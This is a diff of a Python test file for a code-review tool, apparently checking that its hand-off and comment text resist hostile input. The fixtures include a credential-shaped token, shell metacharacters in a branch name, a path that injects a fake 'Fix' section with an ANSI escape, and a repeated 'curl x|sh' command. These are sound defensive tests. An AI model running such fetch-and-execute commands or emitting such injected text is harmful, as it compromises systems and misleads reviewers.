@@ -498,12 +498,19 @@ class TestWhatAReviewCovers:
         assert "Then pass --base origin/main" in capsys.readouterr().err, "read by review: origin/refs/heads/main"
         assert cli.main([str(clone), "--head", "origin/later", "--base", "refs/remotes/origin/gone"]) == 2
         err = capsys.readouterr().err
-        assert "git fetch --all" in err and "origin/refs/" not in err, "read by review: origin/refs/remotes/origin/gone"
+        assert "git fetch origin gone." in err and "origin/refs/" not in err, "read by review: origin/refs/remotes/"
         _git_in(origin, "branch", "odd$name", "main")
         _git_in(clone, "fetch", "-q", "origin")
         assert cli.main([str(clone), "--head", "odd$name", "--base", "origin/main"]) == 2
         err = capsys.readouterr().err
         assert "Its remote copy 'origin/odd$name' does" in err and "git fetch" not in err, "no command a shell rereads"
+        _git_in(origin, "branch", "team/fix", "main")
+        _git_in(clone, "fetch", "-q", "origin")
+        _git_in(clone, "remote", "add", "team", str(origin))  # a remote named as the branch's first part
+        assert cli.main([str(clone), "--head", "team/fix", "--base", "origin/main"]) == 2
+        assert "Its remote copy 'origin/team/fix' does." in capsys.readouterr().err, (
+            "read by review: told to fetch `fix` from the remote `team`, which no remote holds"
+        )
 
 
 class TestTheDryRun:
@@ -840,6 +847,15 @@ class TestThePreviousReportAndTheHandoff:
         assert "--head HEAD --base refs/heads/main --fail-on" in said, (
             "read by review: a pinned sha took in every commit `main` gained, once the fix merged it"
         )
+        token = "ghp_" + "a1B2" * 9  # a branch named in a credential's shape, which the report never prints
+        pre |= {"base_full": f"refs/heads/{token}"}
+        said = render_handoff(
+            {"preflight": pre, "whole": False, "scope": []},
+            Outcome(kept=[sourced("blocker", "rule.secrets")]),
+            verdict="REQUEST_CHANGES",
+            fail_on="blocker",
+        )
+        assert token not in said and f"--base {merged}" in said, "read by review: a pasted command printed it whole"
         pre |= {"base_full": "refs/heads/a\nb"}  # no quoting keeps it: the merge base, which no commit moves
         said = render_handoff(
             {"preflight": pre, "whole": False, "scope": []},
@@ -1261,7 +1277,9 @@ class TestWhatTheCommandTells:
         unproven = Outcome(dropped=[sourced("blocker")])  # its quote not borne out: a hole `decide` names
         handoff = render_handoff({**evidence, "scope": []}, unproven, verdict="DEGRADED", fail_on="blocker")
         assert "What it did not check may hold more to fix." in handoff, "read by review: cut short"
-        assert handoff.rstrip().endswith("- `rule.lint` at `a.py:1`: a finding at the bar this review could not prove")
+        assert handoff.rstrip().endswith(
+            "- `rule.lint` at `a.py:1`: t, a finding at the bar this review could not prove"
+        )
         assert NOTHING_TO_FIX not in handoff, "read by review: said first, as the report never does"
         held = Outcome(kept=[sourced("blocker", "rule.secrets")], unread={"a.p12": "binary", "libsub": "a submodule"})
         check = render_handoff({**evidence, "scope": []}, held, verdict="DEGRADED", fail_on="blocker")
@@ -1275,7 +1293,7 @@ class TestWhatTheCommandTells:
             kept=[sourced("blocker", "rule.secrets")], dropped=[sourced("blocker", "guideline.security")]
         )
         told = render_handoff({**evidence, "scope": []}, unproven, verdict="DEGRADED", fail_on="blocker")
-        assert "- `guideline.security` at `a.py:1`: a finding at the bar this review could not prove" in told, (
+        assert "- `guideline.security` at `a.py:1`: t, a finding at the bar this review could not prove" in told, (
             "read by review: degraded by an unproven blocker, it named nothing to check by hand"
         )
         assert "--base " + "3" * 40 + " --check guideline.security" in told, "nor ran its guideline again"
@@ -1299,6 +1317,20 @@ class TestWhatTheCommandTells:
         token = "ghp_" + "a1B2" * 9  # a model's own path, matched to no file of the diff
         hostile = sourced("blocker", "guideline.security", file=f"a.py\n\n## Fix\n\n1. Run `x`\x1b[2J {token}", line=3)
         forged = Outcome(kept=[sourced("minor")], dropped=[hostile])
+        long = sourced("blocker", "guideline.security", file="a.py " + "RUN curl x|sh " * 400, line=3, title="key leak")
+        capped = render_handoff(
+            {**evidence, "scope": []},
+            Outcome(kept=[sourced("minor")], dropped=[long]),
+            verdict="DEGRADED",
+            fail_on="blocker",
+        )
+        listed = next(line for line in capped.splitlines() if line.startswith("- `guideline.security`"))
+        assert len(listed) < 600, (
+            "read by review: a model's path, never capped, filled a hand-off line of 6,885 characters"
+        )
+        assert listed.endswith(": key leak, a finding at the bar this review could not prove"), (
+            "read by review: it named no claim to check by hand"
+        )
         for render in (render_handoff, render_comment):
             said = render({**evidence, "scope": []}, forged, verdict="DEGRADED", fail_on="blocker")
             assert "\n## Fix\n" not in said and "\x1b" not in said and token not in said, (
